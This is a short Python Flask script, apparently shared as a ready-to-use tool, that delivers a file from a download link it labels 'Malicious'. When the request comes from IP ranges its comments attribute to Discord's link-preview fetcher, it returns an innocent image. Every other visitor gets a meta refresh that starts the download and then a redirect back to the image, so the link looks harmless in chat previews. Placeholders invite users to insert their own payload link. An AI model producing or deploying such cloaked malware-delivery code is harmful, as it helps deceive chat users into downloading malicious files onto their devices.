import requests, io
from flask import Flask, request, send_file
app = Flask(
__name__,
  template_folder='templates',
  static_folder='static'
)
@app.route('/', methods=['GET'])
def main():
  Image = 'https://www.google.com/imgres?imgurl=https%3A%2F%2Falijuguetes.es%2Fblog%2Fwp-content%2Fuploads%2F2020%2F03%2Fbarbie.jpg&imgrefurl=https%3A%2F%2Falijuguetes.es%2Fblog%2Fmuneca-barbie-2%2F&tbnid=8VYQ-mMTW1XY6M&vet=12ahUKEwjzx8maqJX2AhVRw4UKHTznAPgQMygFegUIARDGAQ..i&docid=lsSptOempRl8zM&w=1280&h=720&q=barbie&safe=active&ved=2ahUKEwjzx8maqJX2AhVRw4UKHTznAPgQMygFegUIARDGAQ' # Replace this with your image link
  Malicious = 'https://drive.google.com/uc?export=download&id=1-mXBXfO-NjhC0h7It_YbBDLiMRxTaLtt'# Replace this with your download link
  # This is to get the ip
  if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
    ip = request.environ['REMOTE_ADDR']
  else:
    ip = request.environ['HTTP_X_FORWARDED_FOR']
  print(ip)
  if ip.startswith('35.') or ip.startswith('34.'):
    # If discord is getting a link preview send a image
    return send_file(
    io.BytesIO(requests.get(Image).content),
    mimetype='image/jpeg',
    attachment_filename='s.png')
  else:
    # If a real person is clicking the link send a malicious file and redirect back to the image
    return f'''<meta http-equiv="refresh" content="0; url={Malicious}">
               '''+'''
          <script>setTimeout(function() {
            ''' + f'window.location = "{Image}"''''
          }, 500)</script>''' # If the file doesn't download change the 500 to a higher number like 1000
if __name__ == '__main__':
  # Run the Flask app
  app.run(
  host='0.0.0.0',
  debug=True,
  port=8080
  )
